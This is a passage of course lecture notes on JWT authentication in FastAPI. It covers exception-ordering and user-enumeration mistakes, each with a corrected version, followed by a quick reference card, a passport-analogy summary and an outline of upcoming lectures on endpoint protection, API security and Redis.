except ExpiredSignatureError:  # ← DEAD CODE! Never reached!
    raise HTTPException(status_code=401, detail="Token expired")

# ✅ CORRECT: Specific first, general second (Week 1 Lecture 2 pattern)
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
except ExpiredSignatureError:
    raise HTTPException(status_code=401, detail="Token expired")
except JWTError:
    raise HTTPException(status_code=401, detail="Invalid token")
```

---

### Mistake 6: Returning different errors for "user not found" vs "wrong password"

```python
# ❌ WRONG: Leaks information — attacker learns which emails exist
if not user:
    raise HTTPException(status_code=404, detail="User not found")
if not verify_password(password, user.hashed_password):
    raise HTTPException(status_code=401, detail="Wrong password")

# ✅ CORRECT: Same error for both (Lecture 1 reinforcement)
if not user or not verify_password(password, user.hashed_password):
    raise HTTPException(status_code=401, detail="Invalid email or password")
# Attacker can't tell if the email exists or the password is wrong.
```

---

# Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│                    JWT QUICK REFERENCE                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  INSTALL:                                                       │
│      pip install "python-jose[cryptography]"                    │
│                                                                 │
│  IMPORTS:                                                       │
│      from jose import jwt, JWTError, ExpiredSignatureError      │
│      from datetime import datetime, timedelta, timezone         │
│                                                                 │
│  CREATE TOKEN:                                                  │
│      payload = {"sub": user_id, "exp": expire, "type": "access"}│
│      token = jwt.encode(payload, SECRET_KEY, algorithm="HS256") │
│                                                                 │
│  DECODE TOKEN:                                                  │
│      payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])│
│      # Raises ExpiredSignatureError if expired                  │
│      # Raises JWTError if invalid signature / malformed         │
│                                                                 │
│  STANDARD CLAIMS:                                               │
│      "sub" — subject (user ID)                                  │
│      "exp" — expiration (datetime or unix timestamp)            │
│      "iat" — issued at (datetime or unix timestamp)             │
│      "jti" — unique token ID (for rotation tracking)            │
│                                                                 │
│  CUSTOM CLAIMS:                                                 │
│      "type" — "access" or "refresh"                             │
│                                                                 │
│  TYPICAL EXPIRATION:                                            │
│      Access token:  15-30 minutes                               │
│      Refresh token: 7-30 days                                   │
│                                                                 │
│  COMMON MISTAKES:                                               │
│      ❌ Secrets in payload    → Payload is readable by anyone   │
│      ❌ algorithms="HS256"    → Must be a list: ["HS256"]       │
│      ❌ Weak secret key       → Use secrets.token_hex(32)       │
│      ❌ No "type" claim       → Refresh used as access token    │
│      ❌ Long access expiry    → 15 min max for access tokens    │
│      ❌ datetime.utcnow()     → Use datetime.now(timezone.utc)  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# Summary: The Key Mental Model

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  JWT = SELF-CONTAINED PROOF OF IDENTITY                         │
│                                                                 │
│  The server issues a signed token at login.                     │
│  The client carries it on every request.                        │
│  The server verifies the signature — no database lookup needed. │
│                                                                 │
│  ┌────────────────────────────────────────────────────────┐     │
│  │              header.payload.signature                  │     │
│  │              ──────┬───────┬──────────                 │     │
│  │                    │       │                           │     │
│  │  Format info       │       │  Proves authenticity      │     │
│  │  (algorithm)       │       │  (HMAC with secret key)  │     │
│  │                    │       │                           │     │
│  │           User data + metadata                        │     │
│  │           (readable by anyone!)                        │     │
│  │           (but tamper-proof)                           │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                 │
│                                                                 │
│  THE PASSPORT ANALOGY:                                          │
│  ├─ Header    = Passport format (type of booklet)               │
│  ├─ Payload   = Your personal info (visible to everyone)        │
│  ├─ Signature = Holographic seal (only embassy can make it)     │
│  ├─ exp       = Expiration date on the passport                 │
│  ├─ Secret Key= Embassy's stamp mold (NEVER leaked)            │
│  ├─ Access    = Day pass (short-lived, shown constantly)        │
│  ├─ Refresh   = Registration badge (long-lived, used rarely)   │
│  └─ Rotation  = New badge invalidates old one (theft detection) │
│                                                                 │
│                                                                 │
│  CRITICAL SECURITY POINTS:                                      │
│  ├─ JWT is ENCODED, not encrypted — anyone can READ the payload │
│  ├─ The signature prevents TAMPERING, not READING               │
│  ├─ Never put secrets in the payload                            │
│  ├─ Short access tokens + long refresh tokens = security + UX  │
│  └─ HTTPS is mandatory — tokens in plaintext HTTP = game over  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# Connection to Upcoming Lectures

```
┌─────────────────────────────────────────────────────────────────┐
│                    WHERE THIS LEADS                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WEEK 9, LECTURE 3 (Next — Protected Endpoints & RBAC):         │
│  └─ You'll use your tokens to PROTECT endpoints.                │
│     OAuth2PasswordBearer extracts the Bearer token.             │
│     get_current_user dependency decodes it and returns          │
│     the user from DB. Role-based access control checks          │
│     whether that user is allowed to hit this endpoint.          │
│     Everything from today becomes a Depends() chain.            │
│                                                                 │
│  WEEK 9, LECTURE 4 (API Security):                              │
│  └─ CORS configuration — which origins can call your API.       │
│     Rate limiting on /auth/login — brute force prevention.      │
│     OWASP Top 10 — the broader security landscape.              │
│     Today's JWT is one layer of a multi-layer defense.          │
│                                                                 │
│  WEEK 10 (Redis):                                               │
│  └─ Storing refresh tokens in Redis instead of PostgreSQL.      │
│     Redis has built-in TTL — perfect for tokens that expire.    │
│     Token revocation becomes instant O(1) lookup.               │
│     Distributed rate limiting with Redis INCR + EXPIRE.         │
│                                                                 │
│  WEEK 13-14 (Capstone):                                         │
│  └─ Full JWT auth system: registration, login, refresh,         │
│     RBAC per organization, token rotation, audit logging.       │
│     Everything from this lecture at production scale.            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```